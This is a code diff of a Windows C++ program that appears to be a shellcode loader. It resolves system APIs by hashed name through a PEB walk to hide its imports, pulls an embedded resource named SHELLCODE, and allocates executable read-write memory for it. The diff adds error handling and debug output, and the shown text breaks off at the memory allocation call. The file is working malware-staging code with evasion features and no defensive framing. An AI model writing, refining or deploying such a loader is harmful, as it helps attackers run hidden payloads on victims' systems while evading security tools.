@@ -1,22 +1,24 @@
 #include "monolith.hpp"
 #include "definitions.hpp"
 #include "multitool.hpp"
-#include "resource.hpp"
 
+#include <stdio.h>
 #include <cstdint>
 
+#define SHELLCODE       101
 #define FVN_OFFSET		(const unsigned int) 2166136261
 #define FVN_PRIME		(const unsigned int) 16777619
 #define LOCAL_HEAP		((PPEB)__readgsqword(0x60))->ProcessHeap
 
+#define DEBUG
 #ifdef DEBUG
-#define INFO 			printf("[INFO] ")
-#define ERROR 			printf("[ERROR] ")
-#define DBG_PRINT(m,x) 		m; printf x
+#define INFO 			setbuf(stdout, 0); printf("[INFO] ")
+#define ERR 			setbuf(stdout, 0); printf("[ERROR] ")
+#define DBG_PRINT(m,x) 	m; setbuf(stdout, 0); printf x
 #else
 #define INFO 
-#define ERROR 
-#define DBG_PRINT(m,x) 		do {} while (0)
+#define ERR
+#define DBG_PRINT(m,x) 	do {} while (0)
 #endif
 
 HMODULE GetModuleAddress(DWORD hash);
@@ -24,10 +26,9 @@ FARPROC GetSymbolAddress(HMODULE base, DWORD hash);
 
 PAPI ResolveApi() {
 
-	RtlAllocateHeap_t RtlAllocateHeap	= (RtlAllocateHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLALLOCATEHEAP);
-	DBG_PRINT(INFO, ("RtlAllocateHeap: %lx\n", RtlAllocateHeap));
+	auto RtlAllocateHeap	= (RtlAllocateHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLALLOCATEHEAP);
+	auto instance 			= (PAPI)RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(API));
 
-	PAPI instance = (PAPI)instance->win32.RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(API));
 	DBG_PRINT(INFO, ("API* instance: %lx\n", instance));
 
 	instance->win32.NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTALLOCATEVIRTUALMEMORY);
@@ -66,13 +67,12 @@ HMODULE GetModuleAddress(DWORD hash) {
 
 		if (name) {
 			if (hash - HashString(name, wcslen(name)) == 0) {
-				DBG_PRINT(INFO, ("module %ls found\n", name));
 				return (HMODULE)mod->BaseAddress;
 			}
 		}
 		next = next->Flink;
 	}
-	DBG_PRINT(ERROR, ("module (0x%lx) not found\n", hash));
+	DBG_PRINT(ERR, ("module (0x%lx) not found\n", hash));
 	return nullptr;
 }
 
@@ -98,9 +98,8 @@ FARPROC GetSymbolAddress(HMODULE base, DWORD hash) {
 				DBG_PRINT(INFO, ("function %s found\n", name));
 				return (FARPROC) RVA(PULONG, base, functions[ordinals[i]]);
 			}
-			continue;
 		}
-		DBG_PRINT(ERROR, ("function (0x%lx) was not found\n", hash));
+		DBG_PRINT(ERR, ("function (0x%lx) was not found\n", hash));
 		return nullptr;
 	}
 }
@@ -121,13 +120,33 @@ int main() {
 
 	DBG_PRINT(INFO, ("allocating resource\n"));
 
-	resource		= (PRESOURCE) instance->win32.RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(RESOURCE));
+	resource			= (PRESOURCE) instance->win32.RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(RESOURCE));
+	if (!resource) {
+		DBG_PRINT(ERR, ("failed to allocate space for resource: %lx\n", GetLastError()));
+		return 1;
+	}
 	resource->Id		= MAKEINTRESOURCEA(SHELLCODE);
+	if (!resource->Id) {
+		DBG_PRINT(ERR, ("failed to get resource Id: %lx\n", GetLastError()));
+		return 1;
+	}
 	resource->Object	= instance->win32.FindResourceA(NULL, resource->Id, RT_RCDATA);
+	if (!resource->Object) {
+		DBG_PRINT(ERR, ("failed to get pointer to resource object: %lx\n", GetLastError()));
+		return 1;
+	}
 	resource->Length	= instance->win32.SizeofResource(NULL, resource->Object);
+	if (!resource->Length) {
+		DBG_PRINT(ERR, ("failed to get size of resource: %lx\n", GetLastError()));
+		return 1;
+	}
 	resource->hGlobal 	= instance->win32.LoadResource(NULL, resource->Object);
+	if (!resource->hGlobal) {
+		DBG_PRINT(ERR, ("failed to get data from resource: %lx\n", GetLastError()));
+		return 1;
+	}
 
-	DBG_PRINT(INFO, ("resource loaded, allocating\n"));
+	DBG_PRINT(INFO, ("resource loaded, allocating %llu bytes virtual memory\n", resource->Length));
 
 	ntstatus = instance->win32.NtAllocateVirtualMemory(NtCurrentProcess(), &lpBuffer, NULL, &resource->Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (NT_SUCCESS(ntstatus)) {
